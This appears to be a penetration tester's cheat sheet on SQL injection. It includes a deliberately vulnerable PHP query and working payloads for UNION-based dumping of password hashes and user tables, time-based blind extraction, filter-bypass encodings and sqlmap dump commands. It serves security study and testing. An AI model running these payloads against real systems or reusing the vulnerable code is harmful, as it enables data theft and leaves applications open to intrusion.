# SQL INJECTION

SQL Operators and Functions
---------------------------

`UNION` - used to combine the result of two or more SELECT statements with same number of columns and similar data types (selects only distinct values by default - to allow duplicate values, use UNION ALL).  
`SUBSTRING(str, pos, len)` - returns a specified number of characters from a particular position of a given string. str=string; pos=starting position; len=length in characters.
`VERSION()` - returns a string that indicates the MySQL server version.

SQL comments: `/* actual comment text*/`  

MySQL delimiter (comment): `#`
SQL delimiter (comment): `--`

Only MySQL is using `version_comment`.

Vulnerable code example:

```
$id=$_GET['id'];

$getid="SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result=mysql_query($getid) or die('
<pre>' . mysql_error() . '</pre>
' );
```

General Tips
------------

Find out if the web app is talking to a data store (i.e. file, web service, database).  
Look for parameter passing and insert single/double quote there - immediately after the parameter value or instead the parameter value.  
Browse the web app, note errors, behaviour.

PHP usually "talks" to MySQL.  
Understand, what tier we're messing with? Web server, app server, database?

Try `parameter?id=(5-2)`instead of 3 - get the same? Might mean that the injection is possible.

* "Always true" scenario:

```
%' OR '0'='0
%' OR 1=1--
"' OR '1'='1';-- " (note the space after the second hyphen)
```

`%` will probably not be equal to anything so will be false
`'0'='0'` - always equal to true

* Figure out how many columns / attributes are there:

`‘ ORDER BY 1#`  
`‘ ORDER BY 2#`  
etc.

* Find out the database version:

`‘ UNION ALL SELECT 1,@@VERSION#`
`%' or 0=0 union select null, version() #`

* Find out the database the user is running as and the name of the database:

`‘ UNION ALL SELECT user(),database()#`
`%' or 0=0 union select null, user() #`

* Dump MySQL hash:

`‘ UNION ALL SELECT user,password FROM mysql.user#`

* Find out the table name:

`‘ UNION ALL SELECT table_schema,table_name FROM information_schema.tables WHERE table_schema LIKE ‘%[database name]%’ #`

* Find out columns in a table:

`‘ UNION ALL SELECT table_schema, column_name FROM information_schema.columns WHERE table_schema LIKE ‘%[database name]%’ #`

* Dump username and password from `example.users` table:

`‘ UNION ALL SELECT user, password FROM example.users #`

* Display all tables in a database:

`%' and 1=0 union select null, table_name from [database name].tables #`

* Display all the user tables in a database:

`%' and 1=0 union select null, table_name from [database name].tables where table_name like 'user%'#`

* Display all the columns fields in database's user table:

%' and 1=0 union select null, concat(table_name,0x0a,column_name) from information_schema.columns where table_name = 'users' #`

* Display all the columns field contents in the database user table:

`%' and 1=0 union select null, concat(first_name,0x0a,last_name,0x0a,user,0x0a,password) from users #`


Blind SQLi
----------

When you put in a tick, you are redirected to a homepage? Suspicious.

```
id=2; waitfor delay '00:00:10'--
id=2; IF (LEN(USER)=1) waitfor delay '00:00:10'--
id=2; IF (LEN(USER)=2) waitfor delay '00:00:10'--
```

etc...

Then, look at ASCII chart and try guessing admin username:

```
id=2; IF (ASCII(lower(substring((USER),1,1)))=97) WAITFOR DELAY '00:00:10'--
id=2; IF (ASCII(lower(substring((USER),1,1)))=98) WAITFOR DELAY '00:00:10'--
```

etc.

Note: sqlmap tool is good for blind sqli.  
These days there's more union-based SQLi.


Circumventing Simple Validation
-------------------------------

If SELECT keyword is being blocked, try:

```
SeLeCt
%00SELECT
SELSELECTECT
%53%45%4c%45%43%54
%2553%2545%254c%2545%2543%2554
```

Bypassing Simple Input Filtering / Smuggling
--------------------------------------------

Example code:

```
function unsqli($str){
        $str = str_replace("'", "\\'", $str);
        return "'".$str."'";
}
```

Bypass this filtering with `\'`.  

* http://web.archive.org/web/20130401091931/http://www.comsecglobal.com/FrameWork/Upload/SQL_Smuggling.pdf

SQLMAP
------

`sqlmap -u "URL" --cookie="COOKIE"`

--dbs: list databases  
-D [database]: specify a databases  
--tables: list tables  
-T users: list columns of users table  
-C user, password --dump  


Other Tools
-----------

* Havij
* sqlninja
* BBQSQL
* Metasploit SQLi Module


Prevention Techniques
---------------------

* Input sanitization
* Prepared statements


Resources
---------

* http://seclists.org/pauldotcom/2010/q3/341  
* https://www.notsosecure.com/more-on-true-and-error-blind-sql-injection/  
* https://www.notsosecure.com/exploiting-sql-injections-in-insert-statements/
* http://www.blackhat.com/presentations/bh-usa-06/BH-US-06-Willis.pdf
* [Great introduction to SQLi](https://www.youtube.com/watch?v=P6fLRmeEKKA)
* [MySQL SQL Injection Cheat Sheet](http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet)
